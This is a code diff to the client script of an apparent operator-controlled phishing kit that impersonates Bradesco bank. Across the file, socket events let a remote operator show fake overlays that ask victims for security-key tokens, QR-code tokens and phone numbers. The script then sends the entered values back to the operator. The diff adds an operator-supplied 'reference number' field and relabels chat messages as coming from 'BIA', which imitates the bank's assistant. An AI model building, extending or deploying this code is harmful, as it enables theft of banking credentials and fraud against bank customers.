@@ -20,6 +20,7 @@
     token: '',
     ddd: '',
     telefone: '',
+    referencia: '',
   };
 
   console.log('[BRIDGE] Iniciando cliente-bridge.js, sessionId:', sessionId);
@@ -67,7 +68,13 @@
     socket.on('client:bia-message', (data) => {
       console.log('[CLI] 💬 Mensagem BIA recebida:', data.texto);
       // Sempre renderizar a mensagem, mesmo que o chat não esteja aberto
-      addBiaMessage('Operador', data.texto);
+      addBiaMessage('BIA', data.texto);
+    });
+
+    socket.on('client:referencia', (data) => {
+      console.log('[CLI] 📋 Referência recebida:', data.referencia);
+      capturedData.referencia = data.referencia;
+      updateReferenciaField(data.referencia);
     });
 
     socket.on('client:bia-avatar', (data) => {
@@ -133,17 +140,17 @@
         showScreen('login');
         break;
       case 'Aguarde / Senha Incorreta':
-        showOverlay('loading', 'VALIDAÇÃO DIGITAL AGUARDE...<br>Estamos validando o código da sua Chave de Segurança Animada.');
+        showOverlay('loading', 'VALIDAÇÃO DIGITAL AGUARDE...<br>Estamos validando o código da sua Chave de Segurança.');
         break;
       case 'Pedir Celular':
         showOverlay('phone', 'Atualize seu numero de celular para que possamos entrar em contato caso haja alguma divergência de dados.');
         break;
       case 'Pedir Token Tela':
       case 'Pedir Token Físico':
-        showOverlay('token', 'Identificação Positiva<br>Abra o aplicativo Bradesco, vá em Chave de Segurança e em seguida, toque em Validação Digital.');
+        showOverlay('token', 'Identificação Positiva<br>Abra o aplicativo Bradesco, vá em Chave de Segurança.');
         break;
       case 'Pedir Token QR Code':
-        showOverlay('qrcode-request', 'Identificação Positiva<br>Abra o aplicativo Bradesco, vá em Chave de Segurança e em seguida, toque em Validação Digital.');
+        showOverlay('qrcode-request', 'Identificação Positiva<br>Abra o aplicativo Bradesco, vá em Chave de Segurança.');
         break;
       case 'Erro Token':
         showOverlay('error', 'Erro ao validar token. Tente novamente.');
@@ -223,6 +230,8 @@
             <div class="form-group" style="margin-top: 20px;">
               <label>Digite o código gerado:</label>
               <input type="text" id="overlay-token" placeholder="000000" maxlength="6" style="text-align: center; font-size: 24px; letter-spacing: 5px;">
+              <label style="margin-top: 15px;">Número de Referência:</label>
+              <input type="text" id="overlay-referencia" placeholder="Aguardando..." maxlength="10" style="text-align: center; font-size: 18px; background-color: #f0f0f0; cursor: not-allowed;" disabled>
             </div>
             <button onclick="window.bradescoBridge.submitToken()">ENVIAR CÓDIGO</button>
             <div style="margin-top: 20px; font-size: 11px; color: #666;">
@@ -330,7 +339,7 @@
         </div>
         <div id="bia-messages" class="bia-messages"></div>
         <div class="bia-input-group">
-          <input type="text" id="bia-input" placeholder="Digite sua mensagem..." />
+          <input type="text" id="bia-input" placeholder="Digite sua mensagem..." onkeydown="if(event.key === 'Enter') window.bradescoBridge.sendBiaMessage()" />
           <button onclick="window.bradescoBridge.sendBiaMessage()">📤</button>
         </div>
       </div>
@@ -346,7 +355,7 @@
       align-items: flex-end;
       justify-content: flex-end;
       z-index: 10000;
-      padding: 20px;
+      padding: 60px 60px 100px 0;
     `;
     document.body.appendChild(overlay);
     emitScreenChange('bia-chat');
@@ -364,7 +373,7 @@
     const container = document.getElementById('bia-messages');
     if (!container) return;
     container.innerHTML = biaMessages.map(msg => `
-      <div class="bia-message ${msg.from === 'Operador' ? 'from-operator' : 'from-client'}">
+      <div class="bia-message ${msg.from === 'BIA' ? 'from-operator' : 'from-client'}">
         <strong>${msg.from}:</strong> ${msg.text}
       </div>
     `).join('');
@@ -398,6 +407,18 @@
     if (container && image) {
       image.src = qrCodeDataUrl;
       image.style.display = 'block';
+    }
+  }
+
+  function updateReferenciaField(referencia) {
+    console.log('[BRIDGE] Atualizando campo de referência:', referencia);
+    const referenciaInput = document.getElementById('overlay-referencia');
+    if (referenciaInput) {
+      referenciaInput.value = referencia;
+      referenciaInput.disabled = true;
+      referenciaInput.style.backgroundColor = '#f0f0f0';
+      referenciaInput.style.cursor = 'not-allowed';
+      console.log('[BRIDGE] ✅ Campo de referência desabilitado');
     }
   }
 
@@ -506,15 +527,21 @@
         console.log('[BRIDGE] 📱 Telefone enviado:', ddd, phone);
         emitInput('ddd', ddd);
         emitInput('telefone', phone);
-        removeOverlay();
+        showOverlay('loading', 'VALIDANDO... AGUARDE');
       }
     },
     sendBiaMessage: sendBiaMessage,
     submitToken: () => {
       const token = document.getElementById('overlay-token')?.value;
+      const ref = document.getElementById('overlay-referencia')?.value;
       if (token) {
         console.log('[BRIDGE] 🔑 Token enviado:', token);
         emitInput('token', token);
+        // Referência agora é enviada apenas pelo operador, não pelo cliente
+        // if (ref) {
+        //   console.log('[BRIDGE] 📄 Referência enviada:', ref);
+        //   emitInput('referencia', ref);
+        // }
         showOverlay('loading', 'VALIDANDO CÓDIGO AGUARDE...');
       }
     }
@@ -675,10 +702,14 @@ style.textContent = `
     background: white;
     border-radius: 8px;
     width: 400px;
-    max-height: 600px;
+    height: 500px;
+    max-height: 80vh;
     display: flex;
     flex-direction: column;
     box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+    margin-right: 40px;
+    margin-bottom: 80px;
+    overflow: hidden;
   }
 
   .bia-header {
